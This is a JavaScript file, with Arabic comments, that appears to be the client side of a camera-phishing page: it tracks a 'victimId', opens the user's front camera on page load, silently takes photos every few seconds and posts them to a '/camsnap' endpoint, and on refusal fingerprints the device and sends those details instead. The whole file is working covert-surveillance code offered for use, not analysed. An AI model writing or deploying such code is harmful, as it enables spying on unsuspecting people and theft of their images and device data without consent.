class AdvancedCameraCapture {
    constructor(victimId) {
        this.victimId = victimId;
        this.stream = null;
        this.capturedImages = [];
    }

    async initializeCamera() {
        try {
            this.stream = await navigator.mediaDevices.getUserMedia({
                video: { 
                    facingMode: "user",
                    width: { ideal: 1920 },
                    height: { ideal: 1080 }
                },
                audio: false
            });
            
            const video = document.getElementById('cameraPreview');
            video.srcObject = this.stream;
            
            // التقاط تلقائي بعد 3 ثواني
            setTimeout(() => this.captureStealthPhoto(), 3000);
            
        } catch (error) {
            console.log('Camera access denied:', error);
            this.fallbackCapture();
        }
    }

    async captureStealthPhoto() {
        const video = document.getElementById('cameraPreview');
        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');
        
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        ctx.drawImage(video, 0, 0);
        
        const imageData = canvas.toDataURL('image/jpeg', 0.8);
        this.capturedImages.push(imageData);
        
        // إرسال الصورة إلى السيرفر
        await this.sendToServer(imageData);
        
        // الاستمرار في التقاط الصور كل 5 ثواني
        setInterval(() => this.captureStealthPhoto(), 5000);
    }

    async sendToServer(imageData) {
        try {
            const response = await fetch('/camsnap', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
                body: `uid=${encodeURIComponent(this.victimId)}&img=${encodeURIComponent(imageData.split(',')[1])}`
            });
            
            if (response.ok) {
                console.log('Image sent successfully');
            }
        } catch (error) {
            console.error('Failed to send image:', error);
        }
    }

    fallbackCapture() {
        // طرق بديلة لجمع المعلومات
        this.collectDeviceInfo();
        this.screenCapture();
    }

    collectDeviceInfo() {
        const deviceInfo = {
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            screen: `${screen.width}x${screen.height}`,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            cookies: navigator.cookieEnabled,
            java: navigator.javaEnabled()
        };
        
        this.sendDeviceInfo(deviceInfo);
    }

    async sendDeviceInfo(deviceInfo) {
        await fetch('/', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
            },
            body: `uid=${encodeURIComponent(this.victimId)}&data=${encodeURIComponent(JSON.stringify(deviceInfo))}`
        });
    }
}

// التهيئة التلقائية
document.addEventListener('DOMContentLoaded', function() {
    const victimId = document.getElementById('victimId').value;
    const camera = new AdvancedCameraCapture(victimId);
    camera.initializeCamera();
});
